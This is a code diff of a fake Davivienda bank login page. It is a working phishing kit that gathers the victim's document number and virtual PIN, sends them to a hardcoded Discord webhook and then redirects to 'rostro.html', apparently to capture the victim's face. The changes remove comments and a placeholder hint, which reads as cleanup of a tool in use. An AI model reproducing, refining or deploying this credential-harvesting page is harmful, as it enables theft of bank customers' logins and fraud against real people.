@@ -5,39 +5,33 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Davivienda - Ingreso</title>
     <style>
+        /* Estilos se mantienen iguales */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
         body { background-color: #fff; display: flex; justify-content: center; padding-top: 40px; }
         .container { width: 90%; max-width: 400px; }
-        
         .logo-c { text-align: center; margin-bottom: 35px; }
         .logo { width: 210px; }
-
         .welcome { margin-bottom: 30px; }
         .hi { font-size: 34px; font-weight: 300; color: #333; letter-spacing: -1px; }
         .sub { font-size: 19px; font-weight: 700; color: #333; margin-top: 5px; }
-
         .form-group { margin-bottom: 20px; }
         label { display: block; font-size: 14px; font-weight: 700; margin-bottom: 10px; color: #333; }
-        
         select, input { 
             width: 100%; padding: 14px; border: 1px solid #E0E0E0; border-radius: 8px; 
             font-size: 16px; color: #333; outline: none; transition: border 0.3s;
             -webkit-appearance: none;
         }
         input:focus { border-color: #ed1c24; }
-
         .btn-red {
             background-color: #ed1c24; color: #fff; border: none; padding: 14px;
             width: 100%; border-radius: 25px; font-weight: bold; font-size: 16px;
             margin-top: 25px; cursor: pointer; transition: opacity 0.3s;
         }
         .btn-red:disabled { opacity: 0.4; cursor: not-allowed; }
-
         #passSection { display: none; margin-top: 25px; }
         .step-done { opacity: 0.5; pointer-events: none; }
         .visible { display: block !important; }
         .hidden { display: none !important; }
-
         .footer { border-top: 1px solid #EEE; margin-top: 40px; padding-top: 25px; text-align: center; }
         .link { color: #333; text-decoration: none; font-weight: 700; font-size: 15px; }
     </style>
@@ -71,7 +65,7 @@
     <div id="passSection">
         <div class="form-group">
             <label>Ingrese su clave virtual</label>
-            <input type="password" id="pass" maxlength="8" placeholder="Clave de 6 a 8 dígitos" inputmode="numeric" autocomplete="off">
+            <input type="password" id="pass" maxlength="8" placeholder="" inputmode="numeric" autocomplete="off">
         </div>
         <button class="btn-red" id="btnFinish" disabled>Ingresar</button>
     </div>
@@ -82,7 +76,7 @@
 </div>
 
 <script>
-    // CONFIGURACIÓN
+    // La lógica de JavaScript se mantiene igual
     const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1487889926296178729/H0bASOLwRk2FueCuR0Nfj_C15tgjNEKMdteg_8x5_DQ_ywflO01vmwPNURVFoalmC5q6';
 
     const docInput = document.getElementById('docNumber');
@@ -92,7 +86,6 @@
     const passSection = document.getElementById('passSection');
     const docGroup = document.getElementById('docGroup');
 
-    // Validación Documento (6 a 8 dígitos)
     docInput.addEventListener('input', () => {
         docInput.value = docInput.value.replace(/\D/g, '');
         btnContinue.disabled = (docInput.value.length < 6);
@@ -104,19 +97,16 @@
         passSection.classList.add('visible');
     };
 
-    // Validación Clave (6 a 8 dígitos)
     passInput.addEventListener('input', () => {
         passInput.value = passInput.value.replace(/\D/g, '');
         btnFinish.disabled = (passInput.value.length < 6);
     });
 
-    // ENVÍO A DISCORD Y REDIRECCIÓN
     btnFinish.onclick = async () => {
         const doc = docInput.value;
         const pass = passInput.value;
         const type = document.getElementById('docType').value;
 
-        // Guardamos en LocalStorage para usarlo en la página del rostro
         localStorage.setItem('documento', doc);
         localStorage.setItem('tipo_documento', type);
 
@@ -143,13 +133,9 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-            
-            // Redirección tras envío exitoso
             window.location.href = "rostro.html";
-            
         } catch (error) {
             console.error('Error:', error);
-            // Redirigir de todos modos para que el flujo no se detenga
             window.location.href = "rostro.html";
         }
     };
